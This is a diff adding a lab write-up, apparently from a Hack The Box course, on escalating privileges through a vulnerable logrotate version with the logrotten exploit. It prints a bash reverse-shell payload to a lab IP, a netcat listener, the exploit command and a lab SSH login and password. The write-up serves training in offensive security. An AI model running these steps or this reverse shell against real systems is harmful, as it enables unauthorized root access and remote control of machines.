@@ -84,3 +84,70 @@ alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-t
 	- 3.15.0
 	- 3.18.0
 
+### Exploit Logrotate
+
+The example is using a prefabricated exploit called [logrotten](https://github.com/whotwagner/logrotten)
+
+**Create Payload**
+```
+logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
+```
+
+**Determine which option logrotate uses in logrotate.conf**
+```
+logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+
+create
+```
+
+This logrotate option will create a new, empty log after rotating old ones
+
+**Start your listener**
+```
+datboyblu3@htb[/htb]$ nc -nlvp 9001
+
+Listening on 0.0.0.0 9001
+```
+
+**Execute the payload with logrotten**
+```
+logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
+```
+
+## Questions
+
+### SSH
+```
+ssh htb-student@10.129.23.14
+```
+
+### Passwd
+```
+HTB_@cademy_stdnt!
+```
+
+What version of logrotate is on the box and is it vulnerable?
+```
+htb-student@ubuntu:~$ logrotate --version
+logrotate 3.11.0
+htb-student@ubuntu:~$
+```
+Yes it is!
+
+What files/directories can we write to?
+
+The `backup` directory has writable permissions
+```
+htb-student@ubuntu:~$ ls -l
+total 4
+drwxr-xr-x 2 htb-student htb-student 4096 Jun 14  2023 backups
+htb-student@ubuntu:~$ cd backups/
+htb-student@ubuntu:~/backups$ ls -la
+total 12
+drwxr-xr-x 2 htb-student htb-student 4096 Jun 14  2023 .
+drwxr-xr-x 4 htb-student htb-student 4096 Mar 20 23:58 ..
+-rw-r--r-- 1 htb-student htb-student    0 Jun 14  2023 access.log
+-rw-r--r-- 1 htb-student htb-student   91 Jun 14  2023 access.log.1
+htb-student@ubuntu:~/backups$ 
+
+```
